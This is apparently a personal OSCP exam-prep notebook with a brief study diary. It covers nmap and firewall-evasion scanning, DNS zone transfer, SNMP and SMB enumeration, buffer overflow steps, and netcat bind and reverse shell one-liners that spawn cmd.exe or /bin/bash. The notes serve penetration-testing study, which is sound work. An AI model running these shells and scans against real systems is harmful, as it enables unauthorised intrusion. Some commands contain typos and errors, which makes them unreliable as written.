# OSCP Journy - Yasser 
in the name of Allah, the most gracful the most merciful 

**2019-05-20 23:43:53** 

## Table of Content
- [OSCP Journy - Yasser](#oscp-journy---yasser)
  - [Table of Content](#table-of-content)
- [Terminology](#terminology)
- [Linux](#linux)
- [Windows](#windows)
- [Enumration](#enumration)
  - [OSINT](#osint)
  - [Port Scanning](#port-scanning)
- [Buffer Over Flow](#buffer-over-flow)
- [Post Exploitation](#post-exploitation)
  - [Privilege Escalation](#privilege-escalation)
- [VMware](#vmware)
- [Python](#python)
- [Resources](#resources)
- [## Diary](#diary)

Terminology 
==========================
- bind shell    
*listens, good if public IP available*      
- reverse shell   
*connects back*   
- netcat vs ncat vs sbd   
  - **netcat** ->  basic tcp and udp socket tool  
  - **ncat** -> full featured network utility tool from nmap (supports encyptyion)  
  - **sbd** -> clone of ncat, focuses on encryption and portability    
- dns zone transfer    
  *same like database replicatoin, it should be available/accessable for dns slaves only, but admins do not do that*
- axfr   
*dns zone transfer query*
- connect scan 
  * three way handshake scan * 
- syn scan
  * was used to bypass firewall logging, but not anymore with modern firewalls*
- udp scan
  * empty packet is sent, no response? open, icmp packet unreachable response? closed. weird * 
- nmap tcp 65000 generated 4.5MB traffic, full subnet? around 1GB
- netbios     
  * it shouldn't be used any more, it was used for DNS to resolve local names
- SMTP VS IMAP & POP3 
  - SMTP > Push protocol ( Send mail), IMAP & POP3 > pull protocols

- SNMP Community String
  - more of an ID that is sent with every request 
- SOCKS4 vs SOCKS5 vs HTTP Connect vs VPN
  - SOCKS4 -> TCP Proxy, session layer
  - SOCKS5 -> Same but more security (authanticaiton)
  - HTTP Connect -> Only http traffic 
  - VPN -> Layer 3, supports ICMP, UDP and all 

  


Linux 
==========================
- ssh
  - ssh tunnel listen on port 8888, quiet, compression, no command execution, background   
  `sudo ssh -D 8888 -f -C -q -N root@$ip`
  - enable X11 on WSL  
    - install vcxsrv
    - `export DISPLAY=localhost:0.0`
- networking
  - set dhcp 
    - /etc/network/interfaces  
     `` auto eth0   
    iface eth0 inet dhcp/static``
  - set new ip   
  ```  
   ifconfig eth0 $ip netmask 255.255.255.0 up
   service networking restart
   ping 8.8.8.8
   ping google.com
  ```
- find files modfied last 60 min  
 ` find / -cmin 60 `  
- use vim bindings terminal  
  `set -o vi`
- string manipulation
    - cut by delimter, field    
  `cut -d '/' -f 3`
    - sort by unique  
    `sort -u`
    - sort ips of apache logs , -c for count, u for uniq, r for reverse, n for numerical sort, easy
    ` cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -rn`
    - grep
        - most hits, huh? now you have to find what he does
        ` grep $ip | cut -d '"' -f2 | sort -u
        - B = Before , A = After   
        ` grep 'string' apache.log -B1 -A2 `
    
- for loop  
  ` for url in $(cat list.txt); do host $url; done`






Windows 
==========================


Enumration 
==========================


OSINT
-----------------------

- subdomain dns lookup      
`for ip in $(cat brute.txt); do ping -c1 $ip.megacorpone.com; done`     
- reverse dns     
` for ip in $(seq 1 255); do host  38.100.193.$ip; done | grep -v "not found"`     

- whois to find DNS Servers -> look for NS Servers       
` whois megacorpone.com `      
- try zone transfer with extracted DNS Servers     
`host -l megacorpne.com NS2.megacorpone.com`     
- dnsemum & dnsrecon    
  *tools for automating dns zone transfrer*




Port Scanning 
------------------------
- iptables - bandwidh monitoring
`iptables -I OUTPUT 1 -s $ip -j ACCEPT` 
`iptables -I INPUT 1 -s $ip -j ACCEPT`
`iptables -vn -L # numeric list verbose`
`iptables -Z/-F # flush`




- ping scan  
`nmap -sP $ip`
- no reverse dns lookup  
`nmap -n $ip`
- ICMP Echo, timestamp, network mask request discovery
`nmap -PE/PP/PM $ip`
- Syn Packet Discovery   
`nmap -PS  $ip`
- Ack Packet Discovery  
`nmap -PA  $ip`
- TCP Scan most common 3574 ports   
`nmap -sT --top-ports 3674 $ip`
- UDP Scan most common 1017 ports   
`nmap -sU --top-ports 1017 $ip`
- Spoof source address, works with tcp? don't no  
`nmap -S 10.10.10.10 $ip`
- debugging mode, every info you need  
`nmap -d $ip`
- filtered, why?   
`nmap --reason $ip` 
- which host responded? is it the same host or the firewall?   
`nmap --packet-trace $ip`
- change source port, use DNS for ex to bypass some firewalls  
` nmap --source-port 53 $ip`

- good mass scan from external  
`nmap -sP -PE -PS21,22,23,25,80,113,31339,443,445,3389,111 -PA80,113,44,10042 --source-port 53 -iL ips.txt`

- SSH
- DNS
- SMTP
  - check valid users 
  ```
  nc $ip 25   
  VRFY <user>
  ```   
  `smtp_vrfy_users.py <host> <users>`
- POP3
- Netbios 
  `nbtscan -r $ips/24`
  - null session enumration
  `enum4linux -a $ip` 
  - emum4linux multiple hosts
  `for ip in $(cat smb_hosts); do enum4linux $ip > enum4linux_$ip.txt; done` 
- SMB
`nmap --script=smb* $ip`
- NFS
- RPC
- SNMP
  - onesixtyone > snmp scanner, views servers with their community strings, then can be scanned with snmpwalk
  `onesixtyone -c community.txt -i subnet_ips.txt`
  - snmpwalk
    - Enumerating the Entire MIB Tree
     `snmpwalk -c public -v1 $ip`  
    - enumrating windows users
    `snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25`   
    - Enumerating Running Windows Processes:
    `snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2` 
    - Enumerating Open TCP Ports   
    ` snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 `
    - Enumerating Installed Software   
    ` snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2`
  - snmp-check, enumrates and displays values in human readable format, AWESOME!     
  `for ip in $(cat onesixyone.txt); do snmp-check $ip; do > mega_snmpchek.txt`

- HTTP



Buffer Over Flow        
==========================
- how to find buffer overflow? 
  - fuzzing
  - source code review
  - reverse engineering
- steps 
1.  fuzz 
2.  crash
3.  find location of EIP 
4.  overwright EIP location to the memory address of the start of the shell code
5.  inject shellcode + NOP into the input 
6.  profit

- Find bufferoverflow in Slmail
  1. Fuzzing, 200Bytes++
  2. crashed at 2700byte?
  3. use pattern_create.rb -l 2700 and crash it
  4. find the value of EIP and copy it
  5. use pattern_offset -l 2700 -q 4436944? = 2607
  6. A*2607 + B*4 + C*500? good? 
  7. find bad chars by sending this payload after EIP, A*2607 + B*4 + badchars 
  8. follow esp address dump > find chars not following the pattern
  9. found something? remove it from the payload and repeat


- good resource about registers
https://wiki.skullsecurity.org/index.php?title=Registers
- Great Buffer overflow explination (Arabic)
https://www.youtube.com/watch?v=B1emU0Kp-uk
https://www.youtube.com/watch?v=felvN0zJxPg

- registers
  - EIP 
    - instruction pointer -> points to the next command address 
  - ESP
    - stores the return function address 
    - top of the stack
    - uses the stack to store values 




Post Exploitation     
==========================

- File Trasnfer  
  - ncat server 
  `ncat -nlvp 444 > incoming.exe` 
  - ncat client    
  `ncat $ip 4444 < wget.exe`

-  Shells
  - bind shells
    - nc server    
    ` nc -nlvp 4444 -e cmd.exe`
    - hacker 
    ` nc $ip 4444`
  - reverse shell    
    - hacker 
      ` nc -nlvp 4444`
    - user 
      `nc $ip 4444 -e /bin/bash`
  - no -e option no problem 
   `cat /tmp/f | cmd.exe -i 2>&1 | nc -l 4444 > /tmp/f  ` 

   - ncat -- ssl option is awesome, it generates random key each time

Privilege Escalation
----------------------------


VMware
==========================
- mount shared_folder  
    - windows 
    `sudo vmhgfs-fuse .host:/ /root/shared_folder -o allow_other -o uid=1000`
    - linux  
    `sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000`


Python 
===========================

- read from file and loop
```
urls = open('file', 'r/w/b')
for url in urls():
    print(os.system('host {}'.format(url)))
```
- open a socket
```python
import socket   
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((host, 25))
banner = s.recv(1024)
print(banner)
s.send('command')
s.recv(1024)
```


Resources
=========================
- great structured general notes      
  https://xapax.gitbooks.io/security/content/wireshark.html     
- linux privilage escilation      
http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/       
- windows privlage escilation     
http://www.fuzzysecurity.com/tutorials/16.html

## Diary        
===========================


**2019-05-21 05:45:06  Day 1**    
setting up the environment   
ssh tunnel   
ssh public/private key   
vmware setup   
debugging   
vscode    
burp issur   
soo much troubleshooting,    

**2019-05-21 05:45:06  Day 2**   
scripted networking confifurations,   
started wrting notes,   
started the pdf   
page 56/380 haha   

I feel pretty tired now, i need to sleep asap   
alhamdulilah   

**2019-05-22 05:06:52**